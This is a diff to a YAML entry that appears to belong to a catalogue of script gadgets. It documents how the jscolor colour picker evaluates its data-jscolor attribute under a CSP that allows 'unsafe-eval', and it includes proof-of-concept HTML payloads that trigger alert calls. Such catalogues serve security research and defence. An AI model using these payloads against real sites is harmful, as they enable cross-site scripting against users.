@@ -10,24 +10,18 @@ gadgets:
       - chrome-browser
       - firefox-browser
       - safari-browser
-      - input-tag
+      - any-tag
       - data-attr
-      - custom-attr
       - unsafe-eval-csp
       - before-lib-load
-      - after-lib-load
-      - func-call-parameter
-    pocs:
+    Latest:
       - description: |
-          jscolor waits for `DOMContentLoaded` before calling `install()`, so it evaluates every `.jscolor` element regardless of whether it appears before or after the library is loaded. With `'unsafe-eval'` enabled in CSP, both payloads in the snippet below run as soon as the picker initializes.
+          [jscolor](https://github.com/EastDesire/jscolor) waits for `DOMContentLoaded` before calling `install()`, so it evaluates every `.jscolor` element regardless of whether it appears before or after the library is loaded. With `'unsafe-eval'` enabled in CSP, both payloads in the snippet below run as soon as the picker initializes.
         code: |
-          <!-- user input rendered before the library load -->
-          <input class="jscolor" data-jscolor="(function(){alert(1)})()">
+          <!-- user input -->
+          <x class="jscolor" data-jscolor="(function(){alert(document.domain)})()">
 
-          <script src="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js"></script>
-
-          <!-- user input that is parsed after the script tag -->
-          <input value="#3399FF80" class="jscolor" data-jscolor="{a:alert(2)}">
+          <script nonce="secret" src="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js"></script>
       - description: |
           Because the string is wrapped in parentheses, even seemingly safe object literals run as the body of the generated function. Any property initializers therefore execute as soon as jscolor parses the attribute.
         code: |
